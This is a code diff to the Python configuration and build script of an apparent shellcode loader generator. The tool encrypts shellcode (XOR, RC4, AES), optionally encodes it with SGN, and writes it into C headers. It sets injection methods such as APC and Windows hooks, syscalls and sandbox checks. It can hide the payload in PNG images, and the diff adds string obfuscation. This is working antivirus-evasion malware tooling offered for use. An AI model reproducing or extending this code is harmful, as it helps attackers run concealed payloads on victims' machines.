@@ -11,9 +11,8 @@ class ConfigManager:
         self.output_dir = os.path.normpath(os.path.join(current_dir, "..", "Loader"))
         self.shellcode_path = ""
         self.key = None
-        self.sgn_enabled = False  # 添加SGN开关
-        
-        # 配置相关的列表
+        self.sgn_enabled = False  
+
         self.execution_methods = ["AlertAPC", "Fiber", "WindowsHook", "EnumCallback"]
         self.encryption_methods = ["CASE_XOR", "CASE_RC4", "CASE_AES"]
         self.enum_methods = [
@@ -84,10 +83,9 @@ class ConfigManager:
     def encrypt_aes(self, data, key=None):
         if key is None:
             key = secrets.token_bytes(32)
-        iv = secrets.token_bytes(16)  # 生成随机IV
+        iv = secrets.token_bytes(16)  
         cipher = AES.new(key, AES.MODE_CBC, iv)
         ct_bytes = cipher.encrypt(pad(data, AES.block_size))
-        # 将 IV 和 key 合并存储
         self.key = iv + key
         return self.key, ct_bytes
 
@@ -96,7 +94,6 @@ class ConfigManager:
             data = f.read()
 
         if self.sgn_enabled:
-            # 使用SGN进行预处理
             import subprocess
             import os
             
@@ -113,18 +110,15 @@ class ConfigManager:
                     self.shellcode_path
                 ], check=True)
                 
-                # 读取SGN处理后的数据
                 with open(output_path, 'rb') as f:
                     data = f.read()
                 
-                # 清理临时文件
                 os.remove(output_path)
             except subprocess.CalledProcessError as e:
                 raise ValueError(f"SGN处理失败: {str(e)}")
             except Exception as e:
                 raise ValueError(f"SGN处理过程出错: {str(e)}")
 
-        # 继续原有的加密流程
         if method == "CASE_XOR":
             self.key, encrypted_data = self.encrypt_xor(data)
         elif method == "CASE_RC4":
@@ -140,12 +134,11 @@ class ConfigManager:
         output_path = os.path.join(self.output_dir, "shellcode.h")
         with open(output_path, 'w') as f:
             f.write("#pragma once\n\n")
-            # 写入密钥
+            
             f.write("unsigned char key[] = {")
             f.write(",".join(f"0x{b:02x}" for b in self.key))
             f.write("};\n")
             f.write(f"unsigned int key_size = {len(self.key)};\n\n")
-            # 写入加密后的shellcode
             f.write("unsigned char shellcode[] = {")
             f.write(",".join(f"0x{b:02x}" for b in encrypted_data))
             f.write("};\n")
@@ -154,20 +147,20 @@ class ConfigManager:
         output_path = os.path.join(self.output_dir, "shellcode.h")
         with open(output_path, 'w') as f:
             f.write("#pragma once\n\n")
-            # 写入密钥 - 确保key被正确写入
             if self.key is None:
                 raise ValueError("Encryption key is not set")
             f.write("unsigned char key[] = {")
             f.write(",".join(f"0x{b:02x}" for b in self.key))
             f.write("};\n")
             f.write(f"unsigned int key_size = {len(self.key)};\n\n")
-            # 只写入shellcode数组声明
             f.write(f"unsigned char shellcode[{shellcode_size}];\n")
             f.write(f"unsigned int shellcode_size = {shellcode_size};\n")
     def update_config(self, settings):
         config_template = '''#pragma once
 #include <Windows.h>
 #include "Struct.h"
+#include "Tools.h"
+
 //  ====================  CONFIG  ==========================
 static BOOLEAN isSyscall = {syscall};
 static EncryptMethod encryptMethod = {encrypt_method};
@@ -180,7 +173,7 @@ static BOOLEAN trick_SxInDll = {sx_trick};
 static AllocateMethod allocateMethod = {alloc_method};
 static BOOLEAN checkVXQQ = {check_VXQQ};
 static BOOLEAN EnableSteg = {enable_steg};
-static wchar_t const* stegPath = L"\\\\{steg_path}";
+static wchar_t const* stegPath = ENCRYPT_WSTR("\\\\{steg_path}");
 // ==================== CONFIG END ==========================
 '''
         config_content = config_template.format(
@@ -227,7 +220,7 @@ static wchar_t const* stegPath = L"\\\\{steg_path}";
         data_to_hide = size_bytes + shellcode_data
         
         bytes_to_hide = len(data_to_hide)
-        pixels_needed = (bytes_to_hide * 8 + 2) // 3  # 每个像素3个通道
+        pixels_needed = (bytes_to_hide * 8 + 2) // 3 
         width = 512
         height = (pixels_needed + width - 1) // width
         
@@ -238,7 +231,6 @@ static wchar_t const* stegPath = L"\\\\{steg_path}";
             for x in range(width):
                 for c in range(3):
                     if byte_idx < len(data_to_hide):
-                        # 直接设置像素值为数据字节
                         img_array[y, x, c] = data_to_hide[byte_idx]
                         byte_idx += 1
         
@@ -259,7 +251,6 @@ static wchar_t const* stegPath = L"\\\\{steg_path}";
         if verify_size != data_size:
             raise ValueError(f"Size verification failed: {verify_size} != {data_size}")
         
-        # 保存图片
         img = Image.fromarray(img_array)
         img.save(output_path, format='PNG', optimize=False, compress_level=0)
         return True
